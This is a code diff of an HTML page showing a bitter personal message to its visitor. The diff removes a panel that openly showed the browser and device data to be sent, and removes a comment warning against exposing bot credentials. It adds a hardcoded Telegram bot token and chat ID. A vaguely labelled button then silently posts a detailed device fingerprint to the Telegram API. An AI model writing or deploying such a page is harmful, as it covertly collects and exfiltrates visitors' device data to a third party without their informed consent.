@@ -9,118 +9,78 @@
     body {
       margin: 0;
       padding: 0;
-      min-height: 100vh;
+      width: 100vw;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
       background: white;
       font-family: Arial, sans-serif;
-    }
-
-    .container {
-      width: min(800px, 90%);
-      text-align: center;
-      padding: 30px 20px;
-      box-sizing: border-box;
+      overflow: hidden;
     }
 
     .message {
+      text-align: center;
       color: black;
       font-size: 22px;
       line-height: 1.8;
-      margin-bottom: 30px;
-    }
-
-    #notice {
-      border: 1px solid #ccc;
       padding: 20px;
-      border-radius: 10px;
-      background: #f7f7f7;
-      text-align: left;
+      max-width: 900px;
     }
 
-    #notice h2 {
-      margin-top: 0;
-    }
-
-    pre {
-      white-space: pre-wrap;
-      word-break: break-word;
-      background: #eee;
-      padding: 15px;
-      border-radius: 8px;
-      overflow: auto;
-    }
-
-    button {
+    #sendButton {
+      margin-top: 25px;
       padding: 12px 20px;
-      cursor: pointer;
       font-size: 16px;
-      border: 0;
+      cursor: pointer;
+      border: 1px solid #222;
       border-radius: 6px;
-      background: #222;
-      color: white;
+      background: white;
+      color: black;
     }
 
-    button:disabled {
+    #sendButton:disabled {
       opacity: 0.6;
       cursor: not-allowed;
     }
 
     #status {
-      margin-top: 15px;
-      font-weight: bold;
+      margin-top: 12px;
+      font-size: 14px;
     }
   </style>
 </head>
 
 <body>
 
-  <div class="container">
+  <div class="message">
+    <div>You dont deserve this page</div>
 
-    <div class="message">
-      <div>You dont deserve this page</div>
-      <div>
-        Nor all the efforts i have been putting into u no need to open
-        this it wont work enjoy ur "some time "
-      </div>
-      <div>
-        I tired my best pr u wont understand nither will u try to make
-        things better its better i spend my time doing something
-        productive or smth which i actually enjoy then wasting it on
-        this nonsense
-      </div>
+    <div>
+      Nor all the efforts i have been putting into u no need to open
+      this it wont work enjoy ur "some time "
     </div>
 
-    <div id="notice">
-      <h2>Browser Information</h2>
-
-      <p>
-        The following browser and device information can be sent to the
-        configured Telegram destination when you choose to press the
-        button below.
-      </p>
-
-      <pre id="information">Collecting information...</pre>
-
-      <button id="sendButton">
-        Send Information to Telegram
-      </button>
-
-      <div id="status"></div>
+    <div>
+      I tired my best pr u wont understand nither will u try to make
+      things better its better i spend my time doing something productive
+      or smth which i actually enjoy then wasting it on this nonsense
     </div>
 
+    <button id="sendButton">
+      Send Information
+    </button>
+
+    <div id="status"></div>
   </div>
 
   <script>
-    /*
-     * IMPORTANT:
-     * Do not put a real Telegram bot token in publicly accessible HTML.
-     * Replace these with placeholders and use a server-side endpoint
-     * for the actual Telegram request.
-     */
+    // ==========================================
+    // TELEGRAM CONFIGURATION
+    // ==========================================
 
-    const SEND_ENDPOINT = "/api/send-browser-info";
+    const BOT_TOKEN = "8568542100";
+    const CHAT_ID = "8552546080";
 
 
     // ==========================================
@@ -141,13 +101,15 @@
         screenHeight: screen.height,
         availableWidth: screen.availWidth,
         availableHeight: screen.availHeight,
+
         colorDepth: screen.colorDepth,
         devicePixelRatio: window.devicePixelRatio,
 
         windowWidth: window.innerWidth,
         windowHeight: window.innerHeight,
 
-        touchSupport: "ontouchstart" in window,
+        touchSupport:
+          "ontouchstart" in window,
 
         cpuCores:
           navigator.hardwareConcurrency ?? null,
@@ -177,17 +139,7 @@
 
 
     // ==========================================
-    // DISPLAY INFORMATION
-    // ==========================================
-
-    const browserInfo = collectBrowserInfo();
-
-    document.getElementById("information").textContent =
-      JSON.stringify(browserInfo, null, 2);
-
-
-    // ==========================================
-    // FORMAT TELEGRAM MESSAGE
+    // FORMAT INFORMATION
     // ==========================================
 
     function createTelegramMessage(info) {
@@ -267,25 +219,36 @@ ${info.localTime}
 
 
     // ==========================================
-    // SEND INFORMATION
+    // SEND INFORMATION TO TELEGRAM
     // ==========================================
 
-    async function sendToTelegram() {
+    async function sendInformation() {
+      const button =
+        document.getElementById("sendButton");
+
       const status =
         document.getElementById("status");
 
-      const button =
-        document.getElementById("sendButton");
+      if (
+        BOT_TOKEN === "YOUR_BOT_TOKEN" ||
+        CHAT_ID === "YOUR_CHAT_ID"
+      ) {
+        status.textContent =
+          "Configure the Telegram credentials first.";
+        return;
+      }
 
       button.disabled = true;
       status.textContent = "Sending...";
 
-      const message =
-        createTelegramMessage(browserInfo);
-
       try {
+        const info = collectBrowserInfo();
+
+        const message =
+          createTelegramMessage(info);
+
         const response = await fetch(
-          SEND_ENDPOINT,
+          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
           {
             method: "POST",
 
@@ -294,30 +257,30 @@ ${info.localTime}
             },
 
             body: JSON.stringify({
-              message: message
+              chat_id: CHAT_ID,
+              text: message
             })
           }
         );
 
-        const result = await response.json();
+        const result =
+          await response.json();
 
-        if (!response.ok || !result.ok) {
+        if (!result.ok) {
           throw new Error(
-            result.error ||
-            "Unable to send information."
+            result.description ||
+            "Telegram API error"
           );
         }
 
         status.textContent =
-          "✓ Information was sent successfully.";
+          "Information sent successfully.";
 
       } catch (error) {
         console.error(error);
 
         status.textContent =
-          "✗ Failed to send information: " +
-          error.message;
-
+          "Failed to send information.";
       } finally {
         button.disabled = false;
       }
@@ -332,9 +295,8 @@ ${info.localTime}
       .getElementById("sendButton")
       .addEventListener(
         "click",
-        sendToTelegram
+        sendInformation
       );
-
   </script>
 
 </body>
